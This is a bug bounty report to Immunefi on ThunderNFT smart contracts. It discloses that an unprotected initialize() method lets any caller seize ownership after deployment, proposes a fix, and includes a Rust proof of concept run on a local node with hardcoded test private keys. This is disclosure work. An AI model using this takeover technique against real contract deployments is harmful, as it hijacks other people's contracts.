# IOP \_ ThunderNFT 34545 - \[Smart Contract - Low] Smart contract can be taken over by malicious user b

Submitted on Thu Aug 15 2024 13:32:23 GMT-0400 (Atlantic Standard Time) by @jecikpo for [IOP | ThunderNFT](https://immunefi.com/bounty/thundernft-iop/)

Report ID: #34545

Report type: Smart Contract

Report severity: Low

Target: <https://github.com/ThunderFuel/smart-contracts/tree/main/contracts-v1/thunder\\_exchange>

Impacts:

* Contract fails to deliver promised returns, but doesn't lose value
* DoS of contract deployment

## Description

## Brief/Intro

Each smart contract in Thunder NFT system has an `initialize()` method which is used to set the owner of the contract. The owner has access to some privileged methods. There is no verification of who can call `initialize()`and hence it can be called by a malicious user right after the contract deployment.

## Vulnerability Details

Each contract has an `initialize()` method, e.g. from the `ThunderExchange` contract:

```
    fn initialize() {
        require(
            !_is_initialized(),
            ThunderExchangeErrors::Initialized
        );
        storage.is_initialized.write(true);

        let caller = get_msg_sender_address_or_panic();
        storage.owner.set_ownership(Identity::Address(caller));

        [ . . . ]
    }
```

We can see here that it can be called by anyone unless it was called already (the check happens through the `_is_initialized()` function.

A malicious user could be back-running the contract deployment and immediately call the method and hence setting himself as the owner.

## Impact Details

This vulnerability can cause inconvenience within contract deployment as the deployed contract would get useless after a hostile takeover.

In extreme case the takeovers can continue forcing the team to change the code.

## Solution Proposal

Force the owner setting through Sway `configurable` sections which will set the owner during contract deployment making the attack impossible.

## References

<https://github.com/ThunderFuel/smart-contracts/blob/260c9859e2cd28c188e8f6283469bcf57c9347de/contracts-v1/thunder\\_exchange/src/main.sw#L65>

## Proof of concept

## Proof of Concept

The PoC code is below:

```
use std::str::FromStr;
use std::convert::TryInto;

use fuels::{
    prelude::*, 
    types::ContractId, 
    crypto::SecretKey, 
    types::Identity, 
    types::Bits256
};

use rand::Rng;

// Load abi from json
abigen!(Contract(
    name = "ThunderExchange",
    abi = "thunder_exchange/out/debug/thunder_exchange-abi.json"
));

async fn get_contract_instance() -> (ThunderExchange<WalletUnlocked>, ContractId, WalletUnlocked, AssetId) {
    // Launch a local network and deploy the contract
    let provider = Provider::connect("127.0.0.1:4000").await.unwrap();
    //let provider = Provider::connect("testnet.fuel.network").await.unwrap();

    let secret = match SecretKey::from_str(
        "37787bd2cf8a35b8a5a515c45fa109852162596190babcd775a4d08cb1781e4d"
    ) {
        Ok(value) => value,
        Err(e) => panic!("unable to create secret: {}", e),
    };

    let wallet = WalletUnlocked::new_from_private_key(secret, Some(provider.clone()));

    // Generate a random 32-byte array
    let mut rng = rand::thread_rng();
    let mut bytes = [0u8; 32];
    rng.fill(&mut bytes);

    let salt = Salt::new(bytes);

    let id = Contract::load_from(
        "thunder_exchange/out/debug/thunder_exchange.bin",
        LoadConfiguration::default().with_salt(salt),
    )
    .unwrap()
    .deploy(&wallet, TxPolicies::default().with_script_gas_limit(400000).with_max_fee(400000))
    .await
    .unwrap();

    let instance = ThunderExchange::new(id.clone(), wallet.clone());
    let base_asset_id = provider.base_asset_id();

    (instance, id.into(), wallet, *base_asset_id)
}

#[tokio::test]
async fn test_initialization() {
    let (instance, _id, _wallet, _base_asset_id) = get_contract_instance().await;
    let gas_limit = 400000;
    let owner_address = Identity::Address(Address::from(_wallet.address()));

    let second_wallet = get_second_wallet().await;

    let res = instance.clone()
        .with_account(second_wallet)
        .methods()
        .initialize() // smart contract function
        .with_tx_policies(
            TxPolicies::default()
            .with_script_gas_limit(gas_limit)
        )
        .call()
        .await
        .unwrap();

        println!("read result: {:?}", res.value);
        println!("TX id: {:?}", res.tx_id);
}


async fn get_second_wallet() -> WalletUnlocked {
    let provider = Provider::connect("127.0.0.1:4000").await.unwrap();
    //let provider = Provider::connect("testnet.fuel.network").await.unwrap();

    let secret = match SecretKey::from_str(
        "767e2342a22f23440a0755d24b61112c5cd700a1d8100b873bb7fca2ef2779e2"
    ) {
        Ok(value) => value,
        Err(e) => panic!("unable to create secret: {}", e),
    };

    WalletUnlocked::new_from_private_key(secret, Some(provider))
}
```

We can see that the `initialize()` was called successfully from another wallet.
